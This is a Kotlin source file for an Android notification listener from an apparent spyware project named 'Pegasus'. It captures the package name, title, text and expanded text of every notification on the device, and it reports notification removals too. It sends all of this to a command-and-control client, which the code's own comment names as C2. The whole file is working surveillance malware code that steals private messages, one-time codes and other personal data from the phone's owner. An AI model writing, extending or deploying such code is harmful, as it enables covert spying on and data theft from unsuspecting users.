package com.pegasus.services

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.pegasus.utils.LogUtils
import org.json.JSONObject

class NotificationListenerService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        LogUtils.i("Notification Posted: ${sbn.packageName}")
        val notificationData = sbnToJSON(sbn)

        // Send notification data to C2
        PegasusApp.instance.getC2Client().sendResponse(
            JSONObject().apply {
                put("type", "notification_event")
                put("data", notificationData)
            }
        )
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        LogUtils.i("Notification Removed: ${sbn.packageName}")
        PegasusApp.instance.getC2Client().sendResponse(
            JSONObject().apply {
                put("type", "notification_removed")
                put("package", sbn.packageName)
                put("id", sbn.id)
            }
        )
    }

    private fun sbnToJSON(sbn: StatusBarNotification): JSONObject {
        return JSONObject().apply {
            put("package_name", sbn.packageName)
            put("post_time", sbn.postTime)
            put("id", sbn.id)
            put("is_clearable", sbn.isClearable)
            put("is_ongoing", sbn.isOngoing)

            // Extract notification extras if available
            val extras = sbn.notification.extras
            if (extras != null) {
                if (extras.containsKey(Notification.EXTRA_TITLE)) {
                    put("title", extras.getCharSequence(Notification.EXTRA_TITLE)?.toString())
                }
                if (extras.containsKey(Notification.EXTRA_TEXT)) {
                    put("text", extras.getCharSequence(Notification.EXTRA_TEXT)?.toString())
                }
                if (extras.containsKey(Notification.EXTRA_BIG_TEXT)) {
                    put("big_text", extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString())
                }
            }
        }
    }
}